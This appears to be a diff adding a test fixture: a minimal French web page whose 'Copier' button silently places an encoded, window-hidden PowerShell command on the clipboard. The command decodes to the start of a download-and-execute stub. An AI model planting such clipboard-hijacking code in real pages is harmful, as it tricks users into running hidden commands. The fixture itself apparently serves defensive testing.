@@ -1,0 +1,12 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>page quelconque</title>
+<body>
+<p>Une page sans aucune consigne.</p>
+<button id="marqueur">marqueur</button>
+<button id="copy">Copier</button>
+<script>
+  document.getElementById("marqueur").onclick = () => navigator.clipboard.writeText("marqueur-neutre");
+  document.getElementById("copy").onclick = () =>
+    navigator.clipboard.writeText("powershell -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA");
+</script>
